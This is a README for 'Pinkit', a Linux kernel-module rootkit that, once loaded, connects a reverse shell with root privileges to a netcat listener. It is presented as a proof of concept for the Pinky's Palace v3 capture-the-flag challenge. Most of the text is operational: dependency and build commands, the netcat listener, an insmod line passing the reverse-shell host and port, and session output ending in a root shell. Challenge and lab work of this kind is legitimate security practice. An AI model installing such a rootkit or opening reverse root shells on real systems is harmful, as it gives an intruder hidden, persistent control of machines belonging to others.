# Pinkit
A quick LKM rootkit that executes a reverse netcat shell with root privileges.

# Disclaimer
THIS LKM IS A POC ROOTKIT FOR THE PINKY'S PALACE V3 BOOT 2 ROOT CHALLENGE.
THIS LKM IS NOT TO BE USED MALICIOUSLY!!!

INSTALL
[Dependencies]
apt install build-essential linux-headers-$(uname -r)

[Compile Kernel Module]
cd Pinkit; make

[Execute Reverse Shell]
# nc must be installed
nc -lvp 1339 <- Run netcat listener in another shell

[Insert and remove LKM]
[root@Dev Pinkit]# insmod pinkit.ko host="REV_TCP_LH=127.0.0.1" port="REV_TCP_LP=1339"
[root@Dev Pinkit]# cat /proc/modules |grep pink
pinkit 16384 0 - Live 0xffffffffc0aa6000 (PO)
[root@Dev Pinkit]# rmmod pinkit

[Once LKM is loaded shell will connect to nc listener]
[ra_horakhty][Dev][Pinkit]
-> ncat -lvp 1339
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1339
Ncat: Listening on 0.0.0.0:1339
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:41060.
sh: cannot set terminal process group (-1): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4# id
id
uid=0(root) gid=0(root) groups=0(root)
